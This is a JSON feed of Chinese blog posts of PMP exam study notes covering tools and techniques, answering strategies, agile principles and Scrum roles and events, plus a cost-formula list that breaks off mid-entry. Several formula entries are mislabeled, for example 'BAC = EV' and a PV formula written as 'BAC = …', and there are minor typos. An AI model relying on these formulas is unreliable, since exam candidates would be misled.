{
  "version": "https://jsonfeed.org/version/1.1",
  "title": "Coding and Fixing",
  "home_page_url": "https://vxhly.github.io/",
  "feed_url": "https://vxhly.github.io/feed.json",
  "description": "源于生活而高于生活.",
  "items": [
    {
      "title": "工具与技术",
      "url": "https://vxhly.github.io/pmp/examination/toolsand-techniques.html",
      "id": "https://vxhly.github.io/pmp/examination/toolsand-techniques.html",
      "summary": "前言\nPMP 全书中出现了不少的工具与技术, 本文针对这些工具技术进行分类整理和并且对于这些名词做出相应的解释。\n\n",
      "content_html": "<div><p>前言</p>\n<p>PMP 全书中出现了不少的工具与技术, 本文针对这些工具技术进行分类整理和并且对于这些名词做出相应的解释。</p>\n</div>\n\n<h2 id=\"数据收集\" tabindex=\"-1\"> 数据收集</h2>\n<div><p>头脑风暴</p>\n<ul>\n<li>表示在短时间内获得大量创意, 适用于团队环境, 需要引导者进行引导头脑风暴由两部分构成：创意产生和创意分析。</li>\n<li>头脑风暴简单的理解为就是畅所欲言不批评和评价。</li>\n<li>畅所欲言、只求数量, 不求质量。</li>\n</ul>\n</div>\n<div><p>焦点小组</p>\n<ul>\n<li>召集相关方和主体专家讨论项目风险, 成功标准和其他议题。</li>\n<li>一般是同一个领域, 同一个部门的人员(同职能)。</li>\n<li>由 2 个或 2 个以上的人在会议室开会讨论, 其中有一个主持人进行主持, 并且只围绕一个主题进行焦点性讨论。</li>\n<li>比一对一访谈更有利于互动交流。</li>\n<li>主持人引导互动式讨论。</li>\n</ul>\n</div>\n<div><p>访谈</p>\n<ul>\n<li>直接面对面一对一的交谈, 具体是指通过与相关方直接交谈了解高层级需求, 假设条件, 制约因素, 审批标准以及其他信息。</li>\n<li>预设和即兴问题、一对一、多对多、获取机密信息。</li>\n</ul>\n</div>\n<div><p>问卷调查</p>\n<ul>\n<li>受众多样、需快速完成、地理位置分散、适合开展统计分析。</li>\n</ul>\n</div>\n<div><p>标杆对照</p>\n<ul>\n<li>标杆可以是内部或外部、同行业或者不同行业、识别最佳实践、形成改进意见。</li>\n</ul>\n</div>\n<h2 id=\"数据分析\" tabindex=\"-1\"> 数据分析</h2>\n<div><p>挣值分析</p>\n<p>对范围、进度、成本绩效进行综合分析, 发现偏差。</p>\n</div>\n<div><p>根本原因分析</p>\n<p>寻找偏差或潜在问题的根本原因。</p>\n</div>\n<div><p>成本效益分析</p>\n<p>选择成本最低的方案来纠偏。</p>\n</div>\n<h2 id=\"决策\" tabindex=\"-1\"> 决策</h2>\n<div><p>一致同意</p>\n<p>每个人都同意、德尔菲(专家、匿名、多轮、趋同、消除意见)。</p>\n</div>\n<div><p>大多数同意</p>\n<p>超过50%, 一般把决策小组的人数定为奇数。</p>\n</div>\n<div><p>相对多数同意</p>\n<p>相对多数, 通常候选项超过两个时使用。</p>\n</div>\n<h2 id=\"数据表现\" tabindex=\"-1\"> 数据表现</h2>\n<div><p>核对单</p>\n<ul>\n<li>很多组织基于自身经验制定了标准化的核对单, 或者采用所在行业的核对单。</li>\n<li>包括需要考虑的项目, 行动或要点的清单, 常被用作提醒。</li>\n</ul>\n</div>\n<div><p>因果图（鱼刺图）</p>\n<p>显示各种因素对问题结果造成的影响, 用来找出全部原因。</p>\n<ul>\n<li>关键词：找出所有原因</li>\n<li>着眼于刺激思考</li>\n<li>探索理想的结果</li>\n</ul>\n</div>\n<div><p>控制图（过程控制图）</p>\n<p>确定某个过程是否稳定是否在控制之内。</p>\n<ul>\n<li>关键词：针对过程</li>\n<li>确定某流程是否正常运转</li>\n</ul>\n</div>\n<div><p>流程图</p>\n<p>帮助分析问题, 显示系统各组成部分之间的逻辑关系。</p>\n<ul>\n<li>关键词：找原因</li>\n</ul>\n</div>\n<div><p>直方图</p>\n<p>显示各变量的分布, 每一栏代表一种变量, 直观显示各变量所占比例。</p>\n</div>\n<div><p>帕累托图</p>\n<p>特殊的直方图, 按照发生频率大小顺序排列, 表示有多少结果是由已确认的类型的原因引起的。</p>\n<ul>\n<li>关键词：用于识别造成大多数问题的少数重要原因</li>\n<li>着眼于改进质量最重要的问题上</li>\n</ul>\n</div>\n<div><p>趋势图</p>\n<p>反映一个过程在某一段时间的趋势。</p>\n<ul>\n<li>关键词：用来预测未来</li>\n</ul>\n</div>\n<div><p>散点图</p>\n<p>显示两个变量之间的关系和规律(因变量 Y 相对于自变量 X 的变化)。</p>\n</div>\n<div><p>思维导图</p>\n<ul>\n<li>把从头脑风暴中获得的创意整合成一张图, 以反映创意之间的共性与差异, 激发新创意。</li>\n<li>整合、反映共性与差异、激发新创意、脑图。</li>\n</ul>\n</div>\n<div><p>亲和图</p>\n<p>分组、分类。</p>\n</div>\n<h2 id=\"人际关系与团队技能\" tabindex=\"-1\"> 人际关系与团队技能</h2>\n<div><p>名义小组</p>\n<p>促进头脑风暴、投票、优先排序、5分制、数轮。</p>\n</div>\n<div><p>引导</p>\n<p>与主题研讨会结合使用、跨职能、不同部门、协调相关方差异。</p>\n</div>\n<div><p>观察(工作跟随)和交谈</p>\n<p>“工作跟随”、难以或不愿清晰说明、挖掘隐藏的需求。</p>\n</div>\n<div><p>冲突管理</p>\n<ul>\n<li>有助于相关方就目标、成功标准、高层级需求、项目描述、总体里程碑等内容达成一致意见。</li>\n</ul>\n</div>\n<div><p>引导</p>\n<ul>\n<li>是指有效引导团队活动成功以达成决定, 解决方案或结论的能力。</li>\n<li>引导者确保参与者有效参与, 互相理解, 考虑所有意见, 按既定决策流程全力支持得到的结论或结果。</li>\n</ul>\n</div>\n<div><p>会议管理</p>\n<ul>\n<li>不能把各种会议类型混合在一起, 面对面的会议效果是最好的, 根据情况可以举行虚拟会议, 确保有效参与会议, 会议要达成共识,\n要有行动计划。</li>\n<li>会前, 确保会议议程, 主题, 目的和目标和期限。</li>\n<li>会中, 不跑题。</li>\n<li>会后, 要有书面的会议纪要和行动方案</li>\n</ul>\n</div>\n<div><p>X 理论</p>\n<p>（1）员工天生不喜欢工作,只要可能,就会逃避工作。\n（2）由于员工不喜欢工作,因此必须对他们采取强制的措施或惩罚的办法,迫使他们去 实现组织的目标。\n（3）员工只要有可能就会逃避责任,安于现状。\n（4）大多数员工喜欢安逸,没有雄心壮志。</p>\n</div>\n<div><p>Y 理论</p>\n<p>（1）员工视工作如休息、娱乐一般自然。\n（2）如果员工对某项工作做出承诺,他们会进行自我指导和自我控制,以完成任务。\n（3）一般而言,每个人不仅能够承担责任,而且会主动寻求承担责任。\n（4）绝大多数人都具备做出正确决策的能力,而不仅仅管理者具备这一能力。</p>\n</div>\n",
      "date_published": "2022-09-01T20:50:00.000Z",
      "date_modified": "2022-09-11T02:19:19.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "解题思路",
      "url": "https://vxhly.github.io/pmp/examination/problem-solving.html",
      "id": "https://vxhly.github.io/pmp/examination/problem-solving.html",
      "content_html": "<div><p>前言</p>\n<p>记录 PMP 考试的一些解题思路</p>\n</div>\n<h2 id=\"变更题\" tabindex=\"-1\"> 变更题</h2>\n<div><p>提示</p>\n<p>当题干中出现：新的、额外的、设备变化、工作遗漏、范围蔓延、确保缺陷补救正确、争论要不要变更、等等均属于变更题。</p>\n</div>\n<ul>\n<li>变更的本质是对项目管理计划（基准）、可交付成果的修改</li>\n<li>变更往往是出于某种需要, 无所谓好与不好；不要看成是问题, 也不要看成是风险；</li>\n<li>我们更多的是关注变更的受控, 评估对项目管理计划（基准）的影响, 而不是“担心”带来的问题或风险</li>\n<li>对待变更的态度：无所谓“欢迎”还是“不欢迎”, 需要变更就变更, 但是要受控</li>\n</ul>\n<p>变更流程：（了解变更的具体内容或原因, 告知变更的流程, 避免不必要的变更）</p>\n<p>1.记录（项目经理书面记录或要求变更提出者提交书面的变更）2.评估, 3.提交（项目经理提交给 CCB）, 4.更新, 5.通知</p>\n<p>如果获得批准, 就必须要去执行批准的变更, 如果其他相关方有意见可以重新提交新的变更\n如果变更没有获得批准就直接执行了, 则需要：1.停止不良变更（不是停止整个项目）, 2. 补变更流程。</p>\n<h2 id=\"相关方与沟通\" tabindex=\"-1\"> 相关方与沟通</h2>\n<div><p>提示</p>\n<p>相关方的管理在于管理人</p>\n<p>遇到相关方反对、担忧、抵制、威胁、不支持、不参与, 事后提出不同意见等等, 均属于相关方题</p>\n</div>\n<ul>\n<li>如果之前没有识别该相关方：更新相关方登记册, 做好相关方分析和分类（权力利益）</li>\n<li>如果已经识别了该相关方：审查相关方参与计划, 或者, 管理相关方参与（引导参与, 获得支持；谈判沟通, 管理期望；处理风险,\n预测问题；澄清和解决已识别的问题）</li>\n<li>如果问事先要做好什么：早识别、早分析（相关方分析）、早参与</li>\n</ul>\n<div><p>提示</p>\n<p>沟通的管理在于管理信息传递</p>\n<p>信息流传递的问题才是沟通问题：多发少发, 没有及时发, 看不懂, 不是想要的, 不方便阅读, 虚拟团队的沟通问题, 相关方抱在怨沟通不及时,\n虚拟团队的误解, 均是沟通题</p>\n</div>\n<ul>\n<li>常见的选项有：审查管理计划、更新沟通管理计划、创建沟通管理计划, 以及跟规划沟通有关的工具：沟通需求分析, 沟通风格评估等等</li>\n<li>注意区分, 是要你管人, 还是要你管信息的传递；人的问题属于相关方知识领域、信息传递的问题属于沟通知识领域</li>\n</ul>\n<h2 id=\"风险和问题\" tabindex=\"-1\"> 风险和问题</h2>\n<ul>\n<li>风险是一种不确定性的事件, 有概率发生, 发生之后会对项目产生积极或消极的影响</li>\n<li>问题是当前客观存在的情形, 已经对项目产生了影响</li>\n<li>对于风险来说：1. 未来可能发生, 2.一旦发生就会有影响</li>\n<li>对于问题来说：1. 当前客观存在, 2.已经对项目产生影响</li>\n</ul>\n<div><p>风险的题目</p>\n<ul>\n<li>风险的题目（大多数风险题, 题干中会明确说到“可能”带来的影响）</li>\n<li>识别到风险：更新（查阅）风险登记册、定性、定量、规划应对、实施应对</li>\n<li>发生了风险：已知风险, 查阅风险登记册直接应对, 如果要用储备, “应急储备”；未知风险：权变, 走变更流程, 用管理储备</li>\n</ul>\n</div>\n<div><p>问题的题目</p>\n<ul>\n<li>记录问题日志, 分析根本原因（或评估影响）, 确定解决方案。</li>\n<li>问题解决的完整步骤：1.定义, 2.识别, 3.方案, 4.选择, 5.执行, 6.验证</li>\n</ul>\n</div>\n<h2 id=\"原因和根本原因\" tabindex=\"-1\"> 原因和根本原因</h2>\n<div><p>找原因</p>\n<p>如果题目描述的是想要找原因, 问题是使用什么工具和技术, 选项找：<code>根本原因分析</code></p>\n</div>\n<div><p>找根本原因</p>\n<p>如果题目描述的是想要找根本原因, 问题是如何找根本原因, 选项找：<code>鱼骨图</code>、<code>石川图</code>、<code>因果图</code></p>\n</div>\n<h2 id=\"正常收尾流程\" tabindex=\"-1\"> 正常收尾流程</h2>\n<ol>\n<li>获得项目发起人和相关方的批准（验收）</li>\n<li>移交最终成果</li>\n<li>总结经验教训, 提供未来项目或阶段使用</li>\n<li>更新组织过程资产</li>\n<li>文件归档</li>\n<li>释放资源、解散项目团队</li>\n<li>衡量并记录客户满意度</li>\n<li>庆功会</li>\n</ol>\n<h2 id=\"提前收尾流程\" tabindex=\"-1\"> 提前收尾流程</h2>\n<ol>\n<li>在正式的收尾文件中说明项目终止的原因</li>\n<li>把该项目的已完成和未完成的可交付成果移交他人</li>\n<li>总结经验教训, 提供未来项目或阶段使用</li>\n<li>更新组织过程资产</li>\n<li>文件归档</li>\n<li>释放资源、解散项目团队</li>\n</ol>\n",
      "date_published": "2022-09-01T20:50:00.000Z",
      "date_modified": "2022-09-04T04:22:08.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "PMP 敏捷知识点",
      "url": "https://vxhly.github.io/pmp/agile/agile-knowledge.html",
      "id": "https://vxhly.github.io/pmp/agile/agile-knowledge.html",
      "summary": "前言\n在 PMP 中存在大量的敏捷知识点, 本篇将记录相关的重点知识。\n\n",
      "content_html": "<div><p>前言</p>\n<p>在 PMP 中存在大量的敏捷知识点, 本篇将记录相关的重点知识。</p>\n</div>\n\n<h2 id=\"敏捷宣言\" tabindex=\"-1\"> 敏捷宣言</h2>\n<p>我们正在通过亲自开发和帮助他人开发, 发现开发软件的更好方法。通过这项工作, 我们开始更重视：</p>\n<ul>\n<li>个体和交互 胜于 流程和工具</li>\n<li>工作的软件 胜于 详尽的文档</li>\n<li>客户合作 胜于 合同谈判</li>\n<li>响应变化 胜于 遵循计划</li>\n</ul>\n<p>也就是说, 右栏中的项目固然有价值, 但我们更重视左栏中的项目</p>\n<h2 id=\"敏捷十二原则\" tabindex=\"-1\"> 敏捷十二原则</h2>\n<ul>\n<li>准则 1：我们的最高目标是, 通过尽早和持续地交付有价值的软件来满足客户。(及早、持续不断、价值驱动交付、客户满意)</li>\n<li>准则 2：欢迎对需求提出变更, 即使在项目开发后期也不例外。敏捷过程要善于利用需求变更, 帮助客户获得竞争优势。(拥抱变更、提高客户竞争优势)</li>\n<li>准则 3：要经常交付可用的软件, 周期从几周到几个月不等, 且越短越好。(频繁交付、短周期)</li>\n<li>准则 4：项目实施过程中, 业务人员与开发人员必须始终通力合作。(业务和开发相互合作、每天如此)</li>\n<li>准则 5：要善于激励项目人员, 给予他们所需的环境和支持, 并相信他们能够完成任务。(提供环境、支持团队、对团队辅以信任)</li>\n<li>准则 6：无论是对开发团队还是团队内部, 信息传达最有效的沟通方法是面对面的交谈。(面对面沟通效果最好、也可使用虚拟环境)</li>\n<li>准则 7：可用的软件是衡量进度的首要衡量指标。(根据可工作的软件度量)</li>\n<li>准则 8：敏捷过程提倡可持续的开发。项目发起人、开发人员和用户应该保持步调。(可持续开发、步调稳定)</li>\n<li>准则 9：对技术的精益求精以及对设计的不断完善将提高敏捷性。(重构)</li>\n<li>准则 10：简洁, 即尽最大可能减少不必要的工作。这是一门艺术。(简洁、专注团队)</li>\n<li>准则 11：最佳的架构、需求和设计出自于自组织团队。(自组织团队)</li>\n<li>准则 12：团队要定期反省怎么做才能更有效, 并相应地调整团队的行为。(定期回顾、不断改进)</li>\n</ul>\n<h2 id=\"敏捷阶段框架\" tabindex=\"-1\"> 敏捷阶段框架</h2>\n<p>相较于结构化项目管理的启动、规划、执行、监控、收尾五大过程组, 部分流派将敏捷也做了一个五阶段框架：构想、推演、探索、适应、结束。他们不能直接跟结构化项目管理中五大过程组完全匹配对应, 但是可以粗略这样对应。</p>\n<p>构想阶段, 得到产品愿景；推演阶段, 得到用户故事清单、产品待办事项列表、产品发布计划等；探索阶段, 执行得到完成的用户故事；适应阶段对完成的进行把关；结束阶段, 完结整个项目。</p>\n<h2 id=\"四种生命周期及对比\" tabindex=\"-1\"> 四种生命周期及对比</h2>\n<div><p>提示</p>\n<p>计划始终贯穿其中, 每种生命周期都有计划要素, 不同之处在于完成多少计划以及何时完成</p>\n</div>\n<ul>\n<li>预测型生命周期：一种更为传统的方法, 提前进行大量的计划工作, 然后一次性执行；执行是一个连续的过程。也称为瀑布式。</li>\n<li>迭代型生命周期：这种方法允许对未完成的工作进行反馈, 从而改进和修改该工作。</li>\n<li>增量型生命周期：这种方法向客户提供各个已完成的, 可能立即使用的可交付成果。</li>\n<li>敏捷(适应型)生命周期：这种方法既有迭代, 也有增量, 便于完善工作, 频繁交付。</li>\n<li>混合型生命周期：可以实现预测向敏捷的过渡、可以在风险不大, 具有中低程度不确定性的项目中尝试</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>需求</th>\n<th>活动</th>\n<th>交付</th>\n<th>目标</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>预测型</td>\n<td>固定</td>\n<td>整个项目仅一次执行</td>\n<td>一次交付</td>\n<td>管理成本</td>\n</tr>\n<tr>\n<td>迭代型</td>\n<td>动态</td>\n<td>反复执行直至修正</td>\n<td>一次交付</td>\n<td>解决方案的正确</td>\n</tr>\n<tr>\n<td>增量型</td>\n<td>动态</td>\n<td>对给定增量执行一次</td>\n<td>频繁更小规模交付</td>\n<td>速度</td>\n</tr>\n<tr>\n<td>敏捷型</td>\n<td>动态</td>\n<td>反复执行直至修正</td>\n<td>频繁更小规模交付</td>\n<td>通过频繁小规模交付和反馈实现的客户价值</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"仆人式领导\" tabindex=\"-1\"> 仆人式领导</h2>\n<p>特征：建立社区、倾听、同理心、成长承诺、治愈能力、管理能力、意识、洞察力、说服力、化繁为简能力。</p>\n<ol>\n<li>帮助、促进团队发展。</li>\n<li>为团队消除障碍。</li>\n<li>为他人贡献铺路。</li>\n<li>教育相关方, 使其了解为什么要敏捷以及如何敏捷。</li>\n<li>通过指导、鼓励和帮助为团队提供支持。</li>\n<li>通过技术项目管理活动, 如量化风险分析来帮助团队。</li>\n<li>庆祝团队的成功, 为团队与外部团队合作提供支持, 并起到桥梁作用。</li>\n</ol>\n<h2 id=\"敏捷团队特征\" tabindex=\"-1\"> 敏捷团队特征</h2>\n<ol>\n<li>团队规模：3-9 名。</li>\n<li>理想情况下, 集中办公。</li>\n<li>100%专职成员、跨职能团队、通才型专家、自我激励自律的成员。</li>\n<li>鼓励自我管理团队, 由团队成员决定谁执行下一阶段工作。</li>\n<li>敏捷团队与仆人式领导一起茁壮成长, 领导支持团队的工作方法。</li>\n<li>团队频繁创造产品增量, 团队集体对工作负责并共同拥有完成工作所需的所有必要技能。</li>\n<li>限制在制品（WIP）、彼此依赖实现交付。</li>\n<li>以各种方式开展合作（结对、群集、群体开发）。</li>\n<li>敏捷项目要求拥有小规模全功能的团队, 人员不足时, 项目经理也可能要实现部分技术工作。</li>\n</ol>\n<h2 id=\"项目经理作为仆人式领导的职责\" tabindex=\"-1\"> 项目经理作为仆人式领导的职责</h2>\n<ol>\n<li>帮助、促进团队发展。</li>\n<li>为团队消除障碍。</li>\n<li>为他人贡献铺路。</li>\n<li>教育相关方, 使其了解为什么要敏捷以及如何敏捷。</li>\n<li>通过指导、鼓励和帮助为团队提供支持。</li>\n<li>通过技术项目管理活动, 如量化风险分析来帮助团队。</li>\n<li>庆祝团队成功, 为团队与外部团队合作提供支持, 并起到桥梁作用。</li>\n</ol>\n<h2 id=\"敏捷中常见的四大会议\" tabindex=\"-1\"> 敏捷中常见的四大会议</h2>\n<ul>\n<li>迭代规划会议\n<ul>\n<li>确定下一个迭代要完成那些用户故事, 将大家一致认可的用户故事放入迭代待办事项清单中。</li>\n</ul>\n</li>\n<li>每日站会\n<ul>\n<li>团队每天进行沟通的内部短会, 因一版只有 15 分钟且站立进行。</li>\n<li>团队成员只需要讲三点内容：昨天做了什么, 今天计划要做什么, 遇到什么问题。</li>\n</ul>\n</li>\n<li>迭代评审会议\n<ul>\n<li>在迭代结束前演示成果并接受评价的会议。</li>\n</ul>\n</li>\n<li>回顾总结会议\n<ul>\n<li>哪些做得好, 哪些可以做得更好, 下次迭代准备做哪些改进。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"铁三角和敏捷三角\" tabindex=\"-1\"> 铁三角和敏捷三角</h2>\n<p><img src=\"/assets/Iron-Triangle.png\" alt=\"铁三角和敏捷三角\"></p>\n<p>传统项目铁三角：范围相对固定, 成本进度是变量；敏捷铁三角, 成本进度相对固定, 范围是变量；敏捷三角强调价值和质量, 约束（范围、进度、成本）。</p>\n<h2 id=\"敏捷发布规则\" tabindex=\"-1\"> 敏捷发布规则</h2>\n<h3 id=\"版本计划\" tabindex=\"-1\"> 版本计划</h3>\n<div><p>提示</p>\n<p>版本计划规定每个版本（原型）的发布时间</p>\n</div>\n<h3 id=\"发布计划\" tabindex=\"-1\"> 发布计划</h3>\n<div><p>提示</p>\n<p>发布计划规定每个版本的发布需要完成的迭代次数和每次迭代的时间</p>\n</div>\n<ul>\n<li>产品愿景驱动产品路线图</li>\n<li>产品路线图驱动发布规则</li>\n<li>发布规则决定迭代计划</li>\n</ul>\n<h3 id=\"迭代计划\" tabindex=\"-1\"> 迭代计划</h3>\n<div><p>提示</p>\n<p>迭代计划规定一个迭代期内所需实现的用户故事和时间要求</p>\n</div>\n<ul>\n<li>迭代计划安排功能开发</li>\n<li>通过用户故事交付的功能优先级排序（按故事点估算）</li>\n<li>为交付用户故事所创建的任务（按小时估算）</li>\n</ul>\n",
      "image": "https://vxhly.github.io/assets/Iron-Triangle.png",
      "date_published": "2022-07-26T20:20:00.000Z",
      "date_modified": "2022-09-11T02:19:19.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "PMP 敏捷开发流程之Scrum：3355",
      "url": "https://vxhly.github.io/pmp/agile/scrum-3355.html",
      "id": "https://vxhly.github.io/pmp/agile/scrum-3355.html",
      "summary": "前言\n敏捷开发过程重视团队的交流与管理问题, 其提高研发效率的显著效果, 使得敏捷开发逐渐成为继瀑布式开发之后, 最为流行的软件开发方式, 其中, Scrum 过程无疑是目前最为成功的敏捷方法。\nScrum 是用于开发、交付和持续支持复杂产品的一个框架, 是一个增量的、迭代的开发过程。\n\n",
      "content_html": "<div><p>前言</p>\n<p>敏捷开发过程重视团队的交流与管理问题, 其提高研发效率的显著效果, 使得敏捷开发逐渐成为继瀑布式开发之后, 最为流行的软件开发方式, 其中, Scrum 过程无疑是目前最为成功的敏捷方法。</p>\n<p>Scrum 是用于开发、交付和持续支持复杂产品的一个框架, 是一个增量的、迭代的开发过程。</p>\n</div>\n\n<h2 id=\"基本概念\" tabindex=\"-1\"> 基本概念</h2>\n<p>Scrum3355 指的是：3 个核心角色, 3 个工件, 5 个关键事件和 5 个价值观。</p>\n<p>Scrum 是一套解决复杂问题的框架, 让我们以迭代和增量的方式, 在最短时间内交付最大价值的产品。其中的流程并非一定完全硬套, 工具是死的, 要适当的根据实际情况作出调整, 以适合团队的流程为首要原则。</p>\n<p>敏捷也是一个持续优化的过程, 通过持续交付、持续优化、持续改进、持续提升、持续塑造, 最终实现小步快跑, 快速迭代。</p>\n<h2 id=\"_3-个核心角色\" tabindex=\"-1\"> 3 个核心角色</h2>\n<h3 id=\"产品负责人-po\" tabindex=\"-1\"> 产品负责人（PO）</h3>\n<ul>\n<li>负责最大化投资回报率（ROI）, 通过确定产品特性, 把它们翻译成一个有优先级的列表, 为下一个 Sprint 决定在这个列表中哪些应当优先级最高, 并且不断地重新调整优先级和梳理这个列表。</li>\n<li>职责是定义需求, 定义需求优先级, 定义需求的验收标准, 定义产品发布内容与日期。</li>\n</ul>\n<h3 id=\"scrum-master-敏捷教练\" tabindex=\"-1\"> Scrum Master/敏捷教练</h3>\n<ul>\n<li>帮助产品开发团队学习并应用 Scrum 来达成商业价值, 为大家服务, 会做任何力所能及的事情来帮助团队、产品负责人和组织取得成功。</li>\n<li>对应敏捷团队中的项目经理, 但并非是一个项目经理。职责是促进团队的工作, 帮助团队熟悉和掌握敏捷的价值观与框架, 帮助排除影响生产力障碍, 确保团队不受打扰。</li>\n</ul>\n<h3 id=\"开发团队\" tabindex=\"-1\"> 开发团队</h3>\n<ul>\n<li>建造产品负责人所指定的产品。对交付结果负责。</li>\n<li>团队是“跨职能”的, 它包含了所有专业能力, 如开发、测试、需求分析等, 并且它是“自组织”[自管理]的, 被给予很高程度的自治和责任。</li>\n</ul>\n<h2 id=\"_3-个工件\" tabindex=\"-1\"> 3 个工件</h2>\n<h3 id=\"产品代办事项-product-backiog\" tabindex=\"-1\"> 产品代办事项（Product BackIog）</h3>\n<div><p>提示</p>\n<p>产品代办事项, 即产品视角的需求清单。</p>\n</div>\n<ul>\n<li>由 Product Owner 负责维护, 包括增删及优先级排序</li>\n<li>用户故事是其中一种最佳实践</li>\n<li>每项需求都需要描述其外部价值</li>\n</ul>\n<h3 id=\"sprint-迭代代办清单\" tabindex=\"-1\"> Sprint 迭代代办清单</h3>\n<div><p>提示</p>\n<p>Sprint 迭代代办清单, 即此次冲刺周期内规划要完成的内容。</p>\n</div>\n<ul>\n<li>来源于 Product Backlog</li>\n<li>由团队评估和选择 Product BackIog 中哪些放入 Sprint BackIog</li>\n<li>团队需要一起定义“完成”标准</li>\n</ul>\n<h3 id=\"潜在可发产品增量-increment\" tabindex=\"-1\"> 潜在可发产品增量（Increment）</h3>\n<div><p>提示</p>\n<p>可交付产品增量（Increment）, 即冲刺结束后可对外发布的产品功能增量部分。</p>\n</div>\n<ul>\n<li>需要关注其是可工作的软件功能增量</li>\n<li>需要在 Scrum Review 会议上进行展示</li>\n</ul>\n<h2 id=\"_5-个关键事件\" tabindex=\"-1\"> 5 个关键事件</h2>\n<h3 id=\"冲刺-sprint\" tabindex=\"-1\"> 冲刺（Sprint）</h3>\n<ul>\n<li>冲刺 Sprint 或迭代是一个特殊的事件, 或者说其一个容器事件。后续四个事件包含在其中。</li>\n<li>2~4 周, 固定周期, 固定事件开始, 固定事件结束。时间盒是其一个重要概念。</li>\n</ul>\n<h3 id=\"sprint-计划会\" tabindex=\"-1\"> Sprint 计划会</h3>\n<ul>\n<li>Sprint 规划会的核心议题是下一次冲刺要实现的目标和范围。</li>\n<li>从 Product Backlog 中选取高优先级的需求, 确定 Sprint 的目标, 对产品 backIog 中故事进行估算, 以作为是否放入下期的参考。对于需求不清楚的故事, 需要产品负责人进行说明。</li>\n<li>会议中输入是 Product backIog, 输出是 Sprint BackIog。</li>\n</ul>\n<h3 id=\"每日-scrum-站会\" tabindex=\"-1\"> 每日 Scrum 站会</h3>\n<ul>\n<li>站会的目标是促进信息在团队内共享与透明。每次 15 分钟左右, 不对问题进行深入讨论, 每天固定时间召开。</li>\n<li>团队成员需要回答 3 个问题：\n<ul>\n<li>昨天我做了哪些事情</li>\n<li>今天计划要做什么事情</li>\n<li>是否遇到问题, 阻碍达成目标</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"sprint-评审会\" tabindex=\"-1\"> Sprint 评审会</h3>\n<p>评审会在冲刺默契召开, 检查本期的成果, 需要团队全员参与, 并邀请产品相关干系人对产品进行展示, 若与产品负责人预想的不一样, 产品负责人可以拒绝接收成果。</p>\n<h3 id=\"sprint-回顾会\" tabindex=\"-1\"> Sprint 回顾会</h3>\n<p>冲刺结束后, 团队一起复盘本次冲刺的过程, 总结经验与教训, 并形成切实可行的改进清单。</p>\n<h2 id=\"_5-个价值观\" tabindex=\"-1\"> 5 个价值观</h2>\n<ul>\n<li>【开放】- Scrum 把项目中的一切开放给每个人看</li>\n<li>【尊重】- 每个人都有他独特的背景和经验</li>\n<li>【勇气】- 有勇气做出承诺, 履行承诺, 接受别人的尊重</li>\n<li>【专注】- 把你的心思和能力都用到你承诺的工作上去</li>\n<li>【承诺】- 愿意对目标做出承诺, 全身心投入去完成 Scrum 团队的目标, 而不是必须按计划完成, 两者之间是有区别的。</li>\n</ul>\n",
      "date_published": "2022-08-20T19:20:00.000Z",
      "date_modified": "2022-08-30T01:41:28.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "PMP 公式篇",
      "url": "https://vxhly.github.io/pmp/examination/formula.html",
      "id": "https://vxhly.github.io/pmp/examination/formula.html",
      "summary": "前言\n在 PMP 中存在一定的计算题, 一般分布在进度管理和成本管理章节, 以下是记录考试中会使用到的公式以及相关名词解释。\n\n",
      "content_html": "<div><p>前言</p>\n<p>在 PMP 中存在一定的计算题, 一般分布在进度管理和成本管理章节, 以下是记录考试中会使用到的公式以及相关名词解释。</p>\n</div>\n\n<h2 id=\"第四章-整合管理\" tabindex=\"-1\"> 第四章 整合管理</h2>\n<h3 id=\"商业价值与开发周期\" tabindex=\"-1\"> 商业价值与开发周期</h3>\n<div><p>提示</p>\n<p>比值 = 商业价值 / 开发周期</p>\n</div>\n<p>在选择项目的优先级时, 比值越高, 应该被优先选择</p>\n<h2 id=\"第六章-进度管理\" tabindex=\"-1\"> 第六章 进度管理</h2>\n<h3 id=\"三点估算\" tabindex=\"-1\"> 三点估算</h3>\n<p>源自计划评审技术（PERT）。考虑估算中的不确定性和风险, 来提高估算的准确性。</p>\n<p>三个估算值：最可能时间、最乐观时间、最悲观时间</p>\n<div><p>三角分布</p>\n<p>期望值（平均值）= (最悲观 + 最乐观 + 最可能) / 3</p>\n</div>\n<div><p>贝塔分布 （默认分布）</p>\n<p>期望值（平均值）= (最悲观 + 最乐观 + 最可能 * 4) / 6</p>\n</div>\n<div><p>标准差</p>\n<p>标准差 = (最悲观 - 最乐观) / 6</p>\n</div>\n<h2 id=\"第七章-成本管理\" tabindex=\"-1\"> 第七章 成本管理</h2>\n<ul>\n<li>BAC =&gt; 完工预算, 即成本基准（不考虑管理储备）</li>\n<li>PV =&gt; 计划价值, 即到目前为止, 计划做多少</li>\n<li>EV =&gt; 挣值, 即到目前为止, 目前已经做了多少</li>\n<li>AC =&gt; 实际成本, 即到目前为止, 实际花了多少</li>\n<li>SV =&gt; 进度偏差</li>\n<li>CV =&gt; 成本偏差</li>\n<li>SPI =&gt; 进度绩效指数</li>\n<li>CPI =&gt; 成本绩效指数</li>\n<li>TCPI =&gt; 完工尚需绩效指数</li>\n<li>EAC =&gt; 完工估算</li>\n<li>ETC =&gt; 完工尚需估算（使用新的估算方式）</li>\n<li>VAC =&gt; 完工偏差</li>\n</ul>\n<div><p>BAC（完工预算）</p>\n<p>BAC = 完工时的 PV 的总和\nBAC = EV</p>\n</div>\n<div><p>PV（计划价值）</p>\n<p>BAC = 计划工作量 * 预算单价</p>\n</div>\n<div><p>EV（挣值）</p>\n<p>EV = 实际工作量 * 预算单价</p>\n</div>\n<div><p>AC（实际成本）</p>\n<p>EV = 实际工作量 * 实际单价</p>\n</div>\n<div><p>SV（进度偏差）</p>\n<p>SV = EV - PV</p>\n</div>\n<div><p>CV（成本偏差）</p>\n<p>CV 